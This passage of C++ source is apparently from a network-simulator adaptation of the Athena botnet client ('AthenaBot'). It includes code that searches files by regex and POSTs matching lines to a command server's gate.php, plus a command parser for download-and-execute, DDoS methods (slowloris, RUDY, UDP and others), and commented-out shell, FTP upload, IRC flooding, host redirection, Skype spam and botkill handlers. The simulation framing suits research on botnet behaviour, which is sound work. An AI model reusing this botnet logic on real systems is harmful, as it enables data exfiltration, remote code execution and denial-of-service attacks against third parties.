                            while ((ent = readdir (dir)) != NULL) {
                                std::ifstream file (ent->d_name);
                                std::string line;
                                std::regex e(regex);
                                int line_number = 1;
                                while (getline(file, line)) {
                                    if (std::regex_search(line, e)) {
                                        std::string filename (ent->d_name);
                                        search_reply(filename, line_number, line);
                                        break;
                                    }
                                    line_number++;
                                }
                            }
                            closedir (dir);
                        }
                    }
                }
            }
        }
        //ParseCommand(cFinalCommand, nTaskId);
    }
    else if(strstr(cRawMessage, "ERROR_NOT_IN_DB")) {
        bHttpRestart = true;
    }
}

void AthenaBot::search_reply(std::string p, int line_number, std::string line)
{
    bool bReturn = false;

    char cHttpHost[MAX_PATH];
    memset(cHttpHost, 0, sizeof(cHttpHost));

    char cHttpPath[DEFAULT];
    memset(cHttpPath, 0, sizeof(cHttpPath));

    char cBreakUrl[strlen(cServer)];
    memset(cBreakUrl, 0, sizeof(cBreakUrl));
    strcpy(cBreakUrl, cServer);

    char *pcBreakUrl = cBreakUrl;

    if(strstr(pcBreakUrl, "http://"))
        pcBreakUrl += 7;
    else if(strstr(pcBreakUrl, "https://"))
        pcBreakUrl += 8;

    pcBreakUrl = strtok(pcBreakUrl, "/");
    if(pcBreakUrl != NULL)
        strcpy(cHttpHost, pcBreakUrl);

    pcBreakUrl = strtok(NULL, "?");
    if(pcBreakUrl != NULL)
        strcpy(cHttpPath, pcBreakUrl);

    strcpy(cHttpHostGlobal, cHttpHost);
    strcpy(cHttpPathGlobal, cHttpPath);

    char cOutPacket[MAX_HTTP_PACKET_LENGTH];
    memset(cOutPacket, 0, sizeof(cOutPacket));

    cReturnNewline[0] = '\r';
    cReturnNewline[1] = '\n';
    cReturnNewline[2] = '\0';
    strcpy(cOutPacket, "POST /gate.php");
    strcat(cOutPacket, cHttpPath);
    strcat(cOutPacket, " HTTP/1.1");
    strcat(cOutPacket, cReturnNewline);

    strcat(cOutPacket, "Host: ");
    strcat(cOutPacket, cHttpHost);
    strcat(cOutPacket, ":");
    char cHttpPort[7];
    memset(cHttpPort, 0, sizeof(cHttpPort));
    //itoa(usHttpPort, cHttpPort, 10);
    int usHttpPort = 80;
    sprintf(cHttpPort, "%d", usHttpPort);
    strcat(cOutPacket, cHttpPort);
    //strcat(cOutPacket, "192.168.56.102");
    strcat(cOutPacket, cReturnNewline);

    strcat(cOutPacket, "Connection: close");
    strcat(cOutPacket, cReturnNewline);

    strcat(cOutPacket, "Content-Type: application/x-www-form-urlencoded");
    strcat(cOutPacket, cReturnNewline);

    strcat(cOutPacket, "Cache-Control: no-cache");
    strcat(cOutPacket, cReturnNewline);

    strcat(cOutPacket, "Content-Length: ");
    char cHttpContentLength[25];
    memset(cHttpContentLength, 0, sizeof(cHttpContentLength));
    int nPacketDataLength = 2 + strlen(p.c_str());
    sprintf(cHttpContentLength, "%d", nPacketDataLength);
    strcat(cOutPacket, cHttpContentLength);
    strcat(cOutPacket, cReturnNewline);
    strcat(cOutPacket, cReturnNewline);

    char cPacketData[nPacketDataLength];
    memset(cPacketData, 0, sizeof(cPacketData));
    std::ostringstream data;
    data << p << ":" << line_number << ":" << line;
    strcpy(cPacketData, data.str().c_str());

    httpModule->sendRequestToServer(this, cHttpHost, cOutPacket, cPacketData);
}

/*
 * Utilities/srandRelated.cpp
 */
unsigned long AthenaBot::GenerateRandomSeed()
{
    std::default_random_engine generator(simTime().dbl());
    std::uniform_int_distribution<unsigned long> distribution;

    return clock() + time(NULL) + distribution(generator);
}

/**
 * Utilities/Misc.cpp
 */
char *AthenaBot::GenRandLCText() //Generates random lowercase text
{
    static char cRandomText[9];

    for(unsigned short us = 0; us < 8; us++)
        cRandomText[us] = (char)(GetRandNum(26) + 65 + 32);

    return (char*)cRandomText;
}

void AthenaBot::RunThroughUuidProcedure()
{
    memset(cUuid, 0, sizeof(cUuid));
    UUID uuid;
    memset(&uuid, 0, sizeof(UUID));
    fncUuidCreate(&uuid);

    char *ucUuidString = (char *) malloc(50);
    fncUuidToString(&uuid, ucUuidString);

    strcpy(cUuid, (const char*)ucUuidString);
    fncRpcStringFree(ucUuidString);
    StripDashes(cUuid);
}
unsigned long AthenaBot::GetRandNum(unsigned long range) //Returns a random number within a given range
{
    srand(GenerateRandomSeed());

    return rand() % range;
}

/**
 * Encryption/Base64_.cpp
 */
/**
 * encode three bytes using base64 (RFC 3548)
 *
 * @param triple three bytes that should be encoded
 * @param result buffer of four characters where the result is stored
 */
void AthenaBot::_base64_encode_triple(unsigned char triple[3], char result[4])
{
    int tripleValue, i;

    tripleValue = triple[0];
    tripleValue *= 256;
    tripleValue += triple[1];
    tripleValue *= 256;
    tripleValue += triple[2];

    for (i=0; i<4; i++)
    {
        result[3-i] = BASE64_CHARS[tripleValue%64];
        tripleValue /= 64;
    }
}

/**
 * encode an array of bytes using Base64 (RFC 3548)
 *
 * @param source the source buffer
 * @param sourcelen the length of the source buffer
 * @param target the target buffer
 * @param targetlen the length of the target buffer
 * @return 1 on success, 0 otherwise
 */
int AthenaBot::base64_encode(unsigned char *source, size_t sourcelen, char *target, size_t targetlen)
 {
    /* check if the result will fit in the target buffer */
    if ((sourcelen+2)/3*4 > targetlen-1)
        return 0;

    /* encode all full triples */
    while (sourcelen >= 3)
    {
        _base64_encode_triple(source, target);
        sourcelen -= 3;
        source += 3;
        target += 4;
    }

    /* encode the last one or two characters */
    if (sourcelen > 0)
    {
        unsigned char temp[3];
        memset(temp, 0, sizeof(temp));
        memcpy(temp, source, sourcelen);
        _base64_encode_triple(temp, target);
        target[3] = '=';
        if (sourcelen == 1)
            target[2] = '=';

        target += 4;
    }

    /* terminate the string */
    target[0] = 0;

    return 1;
}

/**
 * determine the value of a base64 encoding character
 *
 * @param base64char the character of which the value is searched
 * @return the value in case of success (0-63), -1 on failure
 */
int AthenaBot::_base64_char_value(char base64char)
{
    if (base64char >= 'A' && base64char <= 'Z')
        return base64char-'A';
    if (base64char >= 'a' && base64char <= 'z')
        return base64char-'a'+26;
    if (base64char >= '0' && base64char <= '9')
        return base64char-'0'+2*26;
    if (base64char == '+')
        return 2*26+10;
    if (base64char == '/')
        return 2*26+11;
    return -1;
}

/**
 * decode a 4 char base64 encoded byte triple
 *
 * @param quadruple the 4 characters that should be decoded
 * @param result the decoded data
 * @return lenth of the result (1, 2 or 3), 0 on failure
 */
int AthenaBot::_base64_decode_triple(char quadruple[4], unsigned char *result)
{
    int i, triple_value, bytes_to_decode = 3, only_equals_yet = 1;
    int char_value[4];

    for (i=0; i<4; i++)
        char_value[i] = _base64_char_value(quadruple[i]);

    /* check if the characters are valid */
    for (i=3; i>=0; i--)
    {
        if (char_value[i]<0)
        {
            if (only_equals_yet && quadruple[i]=='=')
            {
                /* we will ignore this character anyway, make it something
                 * that does not break our calculations */
                char_value[i]=0;
                bytes_to_decode--;
                continue;
            }
            return 0;
        }
        /* after we got a real character, no other '=' are allowed anymore */
        only_equals_yet = 0;
    }

    /* if we got "====" as input, bytes_to_decode is -1 */
    if (bytes_to_decode < 0)
        bytes_to_decode = 0;

    /* make one big value out of the partial values */
    triple_value = char_value[0];
    triple_value *= 64;
    triple_value += char_value[1];
    triple_value *= 64;
    triple_value += char_value[2];
    triple_value *= 64;
    triple_value += char_value[3];

    /* break the big value into bytes */
    for (i=bytes_to_decode; i<3; i++)
        triple_value /= 256;
    for (i=bytes_to_decode-1; i>=0; i--)
    {
        result[i] = triple_value%256;
        triple_value /= 256;
    }

    return bytes_to_decode;
}

/**
 * decode base64 encoded data
 *
 * @param source the encoded data (zero terminated)
 * @param target pointer to the target buffer
 * @param targetlen length of the target buffer
 * @return length of converted data on success, -1 otherwise
 */
size_t AthenaBot::base64_decode(const char *source, char *target, size_t targetlen)
{
    char *src, *tmpptr;
    char quadruple[4], tmpresult[3];
    int i;
    size_t tmplen = 3, converted = 0;

    /* concatenate '===' to the source to handle unpadded base64 data */
    //src = (char *)HeapAlloc(GetProcessHeap(), 0, strlen(source)+5);
    src = (char *) malloc(strlen(source)+5);
    if (src == NULL)
        return -1;
    strcpy(src, source);
    strcat(src, "====");
    tmpptr = src;

    /* convert as long as we get a full result */
    while (tmplen == 3)
    {
        /* get 4 characters to convert */
        for (i=0; i<4; i++)
        {
            /* skip invalid characters - we won't reach the end */
            while (*tmpptr != '=' && _base64_char_value(*tmpptr)<0)
                tmpptr++;

            quadruple[i] = *(tmpptr++);
        }

        /* convert the characters */
        tmplen = _base64_decode_triple(quadruple, (unsigned char*)tmpresult);

        /* check if the fit in the result buffer */
        if (targetlen < tmplen)
        {
            //HeapFree(GetProcessHeap(), 0, src);
            free(src);
            return -1;
        }

        /* put the partial result in the result buffer */
        memcpy(target, tmpresult, tmplen);
        target += tmplen;
        targetlen -= tmplen;
        converted += tmplen;
    }

    //HeapFree(GetProcessHeap(), 0, src);
    free(src);
    return converted;
}

/**
 * Hub/IrcUtilities.cpp
 */
char *AthenaBot::GetOs()
{
    if(dwOperatingSystem == WINDOWS_UNKNOWN)
        return (char*)"UNKW";
    else if(dwOperatingSystem == WINDOWS_2000)
        return (char*)"W_2K";
    else if(dwOperatingSystem == WINDOWS_XP)
        return (char*)"W_XP";
    else if(dwOperatingSystem == WINDOWS_2003)
        return (char*)"W2K3";
    else if(dwOperatingSystem == WINDOWS_VISTA)
        return (char*)"WVIS";
    else if(dwOperatingSystem == WINDOWS_7)
        return (char*)"WIN7";
    else if(dwOperatingSystem == WINDOWS_8)
        return (char*)"WIN8";

    return (char*)"ERRO";
}

void AthenaBot::strtr(char *cSource, char *cCharArrayA, char *cCharArrayB)
{
    int nSourceLength = strlen(cSource);

    for(int i = 0; i < nSourceLength; i++)
    {
        if(cSource[i] == '\0')
            break;

        for(unsigned short us = 0; us < strlen(cCharArrayA); us++)
        {
            if(cSource[i] == cCharArrayA[us])
            {
                cSource[i] = cCharArrayB[us];
                break;
            }
            else
            {
                if(us == strlen(cCharArrayA)-1)
                    cSource[i] = cSource[i];
            }
        }
    }
}

/**
 * Protocol/Commands.cpp
 */
bool AthenaBot::HasSpaceCharacter(char *pcScanString) //Checks for any existing space characters in a given string
{
    for(unsigned int ui = 0; ui < strlen(pcScanString); ui++)
    {
        if(pcScanString[ui] == ' ')
            return true;
    }

    return false;
}

char *AthenaBot::DecryptCommand(char *pcCommand)
{
    for(unsigned int ui = 0; ui <= strlen(pcCommand); ui++)
    {
        for(unsigned short us = 0; us <= strlen(cCharacterPoolTwo); us++)
        {
            if(pcCommand[ui] == cCharacterPoolTwo[us])
            {
                pcCommand[ui] = cCharacterPoolOne[us];
                break;
            }
        }
    }

    return pcCommand;
}

void AthenaBot::ParseCommand(char *pcCommand, int taskId) //Parses an already-processed raw command
{
    pcCommand = StripReturns(pcCommand);

    char cFullCommand[DEFAULT];
    strcpy(cFullCommand, pcCommand);

    char *pcArguments = strstr(cFullCommand, " ") + 1;
    char *pcCheckCommand = strtok(pcCommand, " ");
    if(HasSpaceCharacter(cFullCommand)) {

        if(strstr(pcCheckCommand, "download")) {
            if((strstr(pcArguments, "http")) && (strstr(pcArguments, "://"))) {
                bool bValidParameters = true;

                pcCheckCommand += 9;

                bUpdate = false;
                bExecutionArguments = false;

                if(strstr(pcCheckCommand, "update"))
                    bUpdate = true;
                else if(strstr(pcCheckCommand, "abort")) {
                    strcpy(cStoreParameter, pcArguments);
                    bDownloadAbort = true;
                }
                else if(strstr(pcCheckCommand, "arguments"))
                    bExecutionArguments = true;

                if(strstr(pcCheckCommand, "getmd5") && !bExecutionArguments && !bDownloadAbort && !bUpdate)
                    bGlobalOnlyOutputMd5Hash = true;
                else if(strstr(pcCheckCommand, "md5"))
                    bMd5MustMatch = true;

                if(!bDownloadAbort) {
                    char *pcBreakString = strtok(pcArguments, " ");

                    if(pcBreakString != NULL)
                        strcpy(cDownloadFromLocation, pcArguments);
                    else
                        bValidParameters = false;

                    pcBreakString = strtok(NULL, " ");
                    if(pcBreakString != NULL)
                        dwStoreParameter = atoi(pcBreakString);
                    else
                        bValidParameters = false;

                    if(dwStoreParameter < 1)
                        bValidParameters = false;

                    if(bMd5MustMatch && !bGlobalOnlyOutputMd5Hash) {
                        pcBreakString = strtok(NULL, " ");
                        if(pcBreakString != NULL)
                            strcpy(szMd5Match, pcBreakString);
                        else
                            bValidParameters = false;
                    }

                    if(bExecutionArguments) {
                        pcBreakString = strtok(NULL, " ");
                        if(pcBreakString == NULL)
                            bValidParameters = false;

                        strcpy(cStoreParameter, pcBreakString);

                        do {
                            pcBreakString = strtok(NULL, " ");

                            if(pcBreakString != NULL) {
                                strcat(cStoreParameter, " ");
                                strcat(cStoreParameter, pcBreakString);
                            }
                        }
                        while(pcBreakString != NULL);
                    }

                    if(bValidParameters)
                        DownloadExecutableFile();
                    else {
                        bGlobalOnlyOutputMd5Hash = false;
                        bMd5MustMatch = false;
                        bExecutionArguments = false;
                        bDownloadAbort = false;
                        bUpdate = false;
                        memset(szMd5Match, 0, sizeof(szMd5Match));
                    }
                }
            }
        }
        /* SHELL command */
        /*
        else if(strstr(pcCheckCommand, "shell")) {
            system(pcArguments);
            for(unsigned short us = 0; us < 6; us++) {
                if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
                    break;

                Sleep(10000);
            }
        }
        */
        /* FILESEARCH command */
        /*
#ifdef INCLUDE_FILESEARCH
        else if(strstr(pcCheckCommand, "ftp.upload"))
        {
            char *pcBreakString = strtok(pcArguments, " ");

            bool bValidParameters = TRUE;

            if(pcBreakString != NULL)
            {
                if(strstr(pcBreakString, "."))
                    strcpy(cFtpHost, pcBreakString);
                else
                    bValidParameters = FALSE;
            }
            else
                bValidParameters = FALSE;

            pcBreakString = strtok(NULL, " ");
            if(pcBreakString != NULL)
                strcpy(cFtpUser, pcBreakString);
            else
                bValidParameters = FALSE;

            pcBreakString = strtok(NULL, " ");
            if(pcBreakString != NULL)
                strcpy(cFtpPass, pcBreakString);
            else
                bValidParameters = FALSE;

            pcBreakString = strtok(NULL, " ");
            if(pcBreakString != NULL)
            {
                if((strstr(pcBreakString, ":")) && (strstr(pcBreakString, "\\")))
                {
                    strcpy(cStoreParameter, pcBreakString);

                    pcBreakString = strtok(NULL, " ");
                    while(pcBreakString != NULL)
                    {
                        strcat(cStoreParameter, " ");
                        strcat(cStoreParameter, pcBreakString);
                        pcBreakString = strtok(NULL, " ");
                    }
                }
                else
                    bValidParameters = FALSE;
            }
            else
                bValidParameters = FALSE;

            if(bValidParameters)
            {
                HANDLE hThread = CreateThread(NULL, NULL, FtpUploadFile, NULL, NULL, NULL);

                if(!hThread)
                    SendThreadCreationFail();
                else
                    CloseHandle(hThread);
            }
            else
                SendInvalidParameters();
        }
#endif
#ifdef INCLUDE_FILESEARCH
        else if(strstr(pcCheckCommand, "filesearch"))
        {
            strcpy(cStoreParameter, pcArguments);

            bOutputFileSearch = FALSE;

            if(strstr(pcCheckCommand, ".output"))
                bOutputFileSearch = TRUE;

            HANDLE hThread = CreateThread(NULL, NULL, FileSearch, NULL, NULL, NULL);

            if(!hThread)
                SendThreadCreationFail();
            else
                CloseHandle(hThread);
        }
#endif
*/

        /* IRC commands */
        /*
        else if(strstr(pcCheckCommand, "irc")) {
            pcCheckCommand += 4;

            if(strstr(pcCheckCommand, "join"))
            {
                pcCheckCommand += 4;

                sprintf(cSend, "%s %s\r\n", cIrcCommandJoin, pcArguments);

                if(strstr(pcCheckCommand, "busy"))
                {
                    if(bDdosBusy)
                        dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
                }
                else if(strstr(pcCheckCommand, "free"))
                {
                    if(!bDdosBusy)
                        dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
                }
                else
                    dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
            }
            else if(strstr(pcCheckCommand, "part"))
            {
                pcCheckCommand += 4;

                sprintf(cSend, "%s %s\r\n", cIrcCommandPart, pcArguments);

                if(strstr(pcCheckCommand, "busy"))
                {
                    if(bDdosBusy)
                        dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
                }
                else if(strstr(pcCheckCommand, "free"))
                {
                    if(!bDdosBusy)
                        dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
                }
                else
                    dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
            }
            else if(strstr(pcCheckCommand, "raw"))
            {
                SendToIrc(pcArguments);
            }
            else if(strstr(pcCheckCommand, "silent"))
            {
                if(strstr(pcArguments, "on"))
                    bSilent = TRUE;
                else if(strstr(pcArguments, "off"))
                    bSilent = FALSE;
            }
        }
        */

        /* IRCWAR commands */
        /*
#ifdef INCLUDE_IRCWAR
        else if(strstr(pcCheckCommand, "war."))
        {
            pcCheckCommand += 4;

            if(!bRemoteIrcBusy)
            {
                if(strstr(pcCheckCommand, "connect"))
                {
                    char *pcBreakString = strtok(pcArguments, " ");

                    bool bValidParameters = TRUE;

                    if(pcBreakString != NULL)
                    {
                        if(strstr(pcBreakString, "."))
                            strcpy(cRemoteHost, pcBreakString);
                        else
                            bValidParameters = FALSE;
                    }
                    else
                        bValidParameters = FALSE;

                    pcBreakString = strtok(NULL, " ");
                    if(pcBreakString != NULL)
                        usRemotePort = atoi(pcBreakString);
                    else
                        bValidParameters = FALSE;

                    pcBreakString = strtok(NULL, " ");
                    if(pcBreakString != NULL)
                        usRemoteAttemptConnections = atoi(pcBreakString);
                    else
                        bValidParameters = FALSE;

                    if(bValidParameters)
                    {
                        if(usRemoteAttemptConnections > 0 && usRemoteAttemptConnections <= MAX_WAR_CONNECTIONS)
                            StartIrcWar(cRemoteHost, usRemotePort);
                        else
                            SendInvalidParameters();
                    }
                    else
                        SendInvalidParameters();
                }
            }
            else
            {
                bool bValidCommand = FALSE;
                bool bCommandSubmitted = FALSE;

                if(strstr(pcCheckCommand, "raw"))
                {
                    strcpy(cBuild, pcArguments);
                    bValidCommand = TRUE;
                }
                else if(strstr(pcCheckCommand, "join"))
                {
                    strcpy(cBuild, cIrcCommandJoin);
                    strcat(cBuild, " ");
                    strcat(cBuild, pcArguments);
                    bValidCommand = TRUE;
                }
                else if(strstr(pcCheckCommand, "part"))
                {
                    strcpy(cBuild, cIrcCommandPart);
                    strcat(cBuild, " ");
                    strcat(cBuild, pcArguments);
                    bValidCommand = TRUE;
                }
                else if(strstr(pcCheckCommand, "msg"))
                {
                    if(HasSpaceCharacter(pcArguments))
                    {
                        strcpy(cBuild, cIrcCommandPrivmsg);
                        strcat(cBuild, " ");

                        strcpy(cStoreParameter, pcArguments);
                        char *pcBreakString = strtok(pcArguments, " ");
                        strcat(cBuild, pcBreakString);
                        strcat(cBuild, " :");

                        pcBreakString = cStoreParameter + strlen(pcBreakString) + 1;
                        strcat(cBuild, pcBreakString);

                        bValidCommand = TRUE;
                    }
                    else
                        SendInvalidParameters();
                }
                else if(strstr(pcCheckCommand, "notice"))
                {
                    if(HasSpaceCharacter(pcArguments))
                    {
                        strcpy(cBuild, "NOTICE ");

                        strcpy(cStoreParameter, pcArguments);
                        char *pcBreakString = strtok(pcArguments, " ");
                        strcat(cBuild, pcBreakString);
                        strcat(cBuild, " :");

                        pcBreakString = cStoreParameter + strlen(pcBreakString) + 1;
                        strcat(cBuild, pcBreakString);

                        bValidCommand = TRUE;
                    }
                    else
                        SendInvalidParameters();
                }
                else if(strstr(pcCheckCommand, "invite"))
                {
                    if(!HasSpaceCharacter(pcArguments))
                    {
                        strcpy(cStoreParameter, pcArguments);

                        HANDLE hThread = CreateThread(NULL, NULL, SendWarInvites, NULL, NULL, NULL);
                        if(!hThread)
                            SendThreadCreationFail();
                        else
                        {
                            bCommandSubmitted = TRUE;
                            CloseHandle(hThread);
                        }
                    }
                    else
                        SendInvalidParameters();
                }
                else if(strstr(pcCheckCommand, "ctcp"))
                {
                    if(!HasSpaceCharacter(pcArguments))
                    {
                        SendCtcpToWarIrc(pcArguments, FALSE);
                        bCommandSubmitted = TRUE;
                    }
                    else
                        SendInvalidParameters();
                }
                else if(strstr(pcCheckCommand, "dcc"))
                {
                    if(!HasSpaceCharacter(pcArguments))
                    {
                        SendCtcpToWarIrc(pcArguments, TRUE);
                        bCommandSubmitted = TRUE;
                    }
                    else
                        SendInvalidParameters();
                }
                else if(!bWarFlood)
                {
                    if(strstr(pcCheckCommand, "flood.channel"))
                    {
                        strcpy(cStoreParameter, pcCheckCommand);

                        if(strstr(pcCheckCommand, ".hop"))
                            StartChannelFlood(TRUE, pcArguments);
                        else
                            StartChannelFlood(FALSE, pcArguments);
                    }
                    else if(strstr(pcCheckCommand, "kill.user"))
                    {
                        strcpy(cStoreParameter, pcCheckCommand);
                        pcCheckCommand += 9;

                        if(strstr(pcCheckCommand, ".multi"))
                            StartUserFlood(TRUE, pcArguments);
                        else
                            StartUserFlood(FALSE, pcArguments);
                    }
                }

                if(bValidCommand)
                {
                    if(SendToAllWarIrcConnections(cBuild))
                        bCommandSubmitted = TRUE;
                }

                if(bCommandSubmitted)
                    SendSuccessfulWarSubmit(pcCheckCommand);
            }
        }
#endif
*/

        else if(strstr(pcCheckCommand, "ddos.")) {
            pcCheckCommand += 5;

            if(strstr(pcCheckCommand, "browser")) {
                /* DDoS Browser command -- not implemented */
                /*
                if(!bBrowserDdosBusy) {
                    bool bValidParameters = true;

                    char *pcBreakString = strtok(pcArguments, " ");

                    if(pcBreakString != NULL)
                        strcpy(cStoreParameter, pcBreakString);
                    else
                        bValidParameters = false;

                    pcBreakString = strtok(NULL, " ");
                    if(pcBreakString != NULL)
                        dwStoreParameter = atoi(pcBreakString);
                    else
                        bValidParameters = false;

                    if((dwStoreParameter > 1) && (bValidParameters)) {
                        // handle hthread is were the action happens
                        HANDLE hThread = CreateThread(NULL, NULL, MassBrowserDdos, NULL, NULL, NULL);

                        if(!hThread) ;
                        else {
                            bBrowserDdosBusy = true;
                            CloseHandle(hThread);
                        }
                    }
                }
                */
            }
            else {
                // All others use the same DDoS attack method
                bool bBusy = false;

                if(strstr(pcCheckCommand, "http.")) {
                    if(bDdosBusy)
                        bBusy = true;
                }
                else if(strstr(pcCheckCommand, "layer4.")) {
                    if(bDdosBusy)
                        bBusy = true;
                }
                else
                    bBusy = true;

                if(!bBusy) {
                    char *pcBreakString = strtok(pcArguments, " ");

                    if(pcBreakString != NULL)
                        strcpy(urlTarget, pcBreakString);

                    unsigned short usTargetPort = 0;

                    if(!strstr(pcCheckCommand, "bandwith")) {
                        pcBreakString = strtok(NULL, " ");
                        if(pcBreakString != NULL)
                            usTargetPort = atoi(pcBreakString);
                    }

                    DWORD dwAttackLength = 0;
                    pcBreakString = strtok(NULL, " ");
                    if(pcBreakString != NULL)
                        dwAttackLength = atoi(pcBreakString);

                    if((strstr(pcCheckCommand, "rapidget"))
                            || (strstr(pcCheckCommand, "rapidpost"))
                            || (strstr(pcCheckCommand, "slowpost"))
                            || (strstr(pcCheckCommand, "slowloris"))
                            || (strstr(pcCheckCommand, "rudy"))
                            || (strstr(pcCheckCommand, "arme"))
                            || (strstr(pcCheckCommand, "bandwith"))
                            || (strstr(pcCheckCommand, "combo"))
                            || (strstr(pcCheckCommand, "udp"))
                            || (strstr(pcCheckCommand, "ecf")))
                    {
                        if(strstr(pcCheckCommand, "bandwith"))
                            usTargetPort = 80;

                        if((strstr(urlTarget, ".")) && (usTargetPort < 65545) && (dwAttackLength > 0)) {
                            if((usTargetPort >= 0 && strstr(pcCheckCommand, "udp")) || (usTargetPort > 0 && !strstr(pcCheckCommand, "udp"))) {
                                dwStoreParameter = dwAttackLength;
                                currentDdos = new cMessage("DDoS Activate Command");
                                currentDdos->setKind(DDOS_ACTIVATE_EVENT);
                                commandsMap.insert(std::pair<int, int>(currentDdos->getId(), taskId));
                                scheduleAt(simTime() + (simtime_t) 1, currentDdos);
                            }
                        }
                    }
                }
            }
        }

        /* HTTP Status command */
        /*
        else if(strstr(pcCheckCommand, "http")) {
            strcpy(cStoreParameter, pcArguments);

            if(strstr(pcCheckCommand, "status")) {
                HANDLE hThread = CreateThread(NULL, NULL, GetWebsiteStatus, NULL, NULL, NULL);
            }

            /* HOSTBLOCK commands */
            /*
#ifdef INCLUDE_HOSTBLOCK
            if(strstr(pcCheckCommand, "block"))
            {
                if(BlockHost(pcArguments))
                    SendSuccessfullyBlockedHost(pcArguments);
            }
            else if(strstr(pcCheckCommand, "redirect"))
            {
                bool bValidParameters = TRUE;

                char cOriginalHost[DEFAULT];
                char cRedirectToHost[DEFAULT];

                char *pcBreakString = strtok(pcArguments, " ");
                if(pcBreakString != NULL)
                {
                    if(strstr(pcBreakString, "."))
                        strcpy(cOriginalHost, pcBreakString);
                    else
                        bValidParameters = FALSE;
                }
                else
                    bValidParameters = FALSE;

                pcBreakString = strtok(NULL, " ");
                if(pcBreakString != NULL)
                {
                    if(strstr(pcBreakString, "."))
                        strcpy(cRedirectToHost, pcBreakString);
                    else
                        bValidParameters = FALSE;
                }
                else
                    bValidParameters = FALSE;

                if(bValidParameters)
                {
                    if(RedirectHost(cOriginalHost, cRedirectToHost))
                        SendSuccessfullyRedirectedHost(cOriginalHost, cRedirectToHost);
                }
                else
                    SendInvalidParameters();
            }
#endif
        }
    */

            /* VISIT commands */
            /*
#ifdef INCLUDE_VISIT
        else if(strstr(pcCheckCommand, "smartview"))
        {
            pcCheckCommand += 10;

            bool bValidParameters = TRUE;

            char *pcBreakString = strtok(pcArguments, " ");

            if(pcBreakString != NULL)
            {
                if(strstr(pcBreakString, "."))
                    strcpy(cStoreParameter, pcBreakString);
                else
                    bValidParameters = FALSE;
            }

            if(strstr(pcCheckCommand, "add"))
                dwSmartViewCommandType = SMARTVIEW_ADD_ENTRY;
            else if(strstr(pcCheckCommand, "del"))
                dwSmartViewCommandType = SMARTVIEW_DEL_ENTRY;
            else
                bValidParameters = FALSE;

            if(dwSmartViewCommandType == SMARTVIEW_ADD_ENTRY)
            {
                pcBreakString = strtok(NULL, " ");
                if(pcBreakString != NULL)
                    uiSecondsBeforeVisit = atoi(pcBreakString);
                else
                    bValidParameters = FALSE;

                pcBreakString = strtok(NULL, " ");
                if(pcBreakString != NULL)
                    uiSecondsAfterVisit = atoi(pcBreakString);
                else
                    bValidParameters = FALSE;

                if(bValidParameters)
                {
                    if(!SmartView())
                    {
#ifndef HTTP_BUILD
                        SendThreadCreationFail();
#endif
                    }
                }
                else
                {
#ifndef HTTP_BUILD
                    SendInvalidParameters();
#endif
                }
            }
            else if(dwSmartViewCommandType == SMARTVIEW_DEL_ENTRY)
                strcpy(cStoreParameter, pcArguments);
        }
#endif
#ifdef INCLUDE_VISIT
        else if(strstr(pcCheckCommand, "view"))
        {
            bool bHidden = FALSE;

            if(strstr(pcCheckCommand, ".hidden"))
                bHidden = TRUE;

            char *pcVisitReturn = SimpleVisit(pcArguments, bHidden);
            if(!strstr(pcVisitReturn, "ERR_FAILED_TO_START"))
            {
#ifndef HTTP_BUILD
                SendSimpleVisitSuccess(pcArguments, pcVisitReturn, bHidden);
#else
                for(unsigned short us = 0; us < 6; us++)
                {
                    if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
                        break;

                    Sleep(10000);
                }
#endif
            }
            else
            {
#ifndef HTTP_BUILD
                SendWebsiteOpenFail(pcArguments);
#endif
            }
        }
#endif
*/

            /* SKYPE MASS MESSENGER commands */
            /*
#ifdef INCLUDE_SKYPE_MASS_MESSENGER
        else if(strstr(pcCheckCommand, "skype"))
        {
            char cSkypePath[MAX_PATH];
            memset(cSkypePath, 0, sizeof(cSkypePath));

            if(SkypeExists(cSkypePath, sizeof(cSkypePath)))
            {
                int nSentMessages = MassMessageSkypeContacts(cSkypePath, pcArguments);

#ifndef HTTP_BUILD
                SendSkypeMessagesSent(nSentMessages);
#else
                for(unsigned short us = 0; us < 6; us++)
                {
                    if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
                        break;

                    Sleep(10000);
                }
#endif
            }
        }
#endif
*/
    }
    else {
        /* LOCK commands */
        /*
        if(strstr(pcCheckCommand, "lock")) {
            /*
#ifdef INCLUDE_LOCK
            pcCheckCommand += 5;

            if(strstr(pcCheckCommand, "off"))
            {
                if(bLockComputer)
                {
                    UnLockComputer();
#ifndef HTTP_BUILD
                    SendComputerUnLocked();
#else
                    for(unsigned short us = 0; us < 6; us++)
                    {
                        if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
                            break;

                        Sleep(10000);
                    }
#endif
                }
            }
            else if(strstr(pcCheckCommand, "on"))
            {
                if(!bLockComputer)
                {
                    LockComputer();
#ifndef HTTP_BUILD
                    SendComputerLocked();
#else
                    for(unsigned short us = 0; us < 6; us++)
                    {
                        if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
                            break;

                        Sleep(10000);
                    }
#endif
                }
            }
#endif
        }
    */

        /* BOTKILL commands */
        /*
#ifdef INCLUDE_BOTKILL
        else if(strstr(pcCheckCommand, "botkill"))
        {
            pcCheckCommand += 8;

            if(strstr(pcCheckCommand, "once"))
            {
                if(!bBotkill)
                {
                    bBotkillOnce = TRUE;
                    bBotkillInitiatedViaCommand = TRUE;
                    StartBotkiller();

#ifdef HTTP_BUILD
                    for(unsigned short us = 0; us < 6; us++)
                    {
                        if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
                            break;

                        Sleep(10000);
                    }
#endif
                }
            }
            else if(strstr(pcCheckCommand, "start"))
            {
                if(!bBotkill)
                {
                    StartBotkiller();
#ifndef HTTP_BUILD
                    SendBotkillerStarted();
#else
                    for(unsigned short us = 0; us < 6; us++)
                    {
                        if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
                            break;

                        Sleep(10000);
                    }
#endif
                }
            }
            else if(strstr(pcCheckCommand, "stop"))
            {
                if(bBotkill)
                {
                    bBotkill = FALSE;
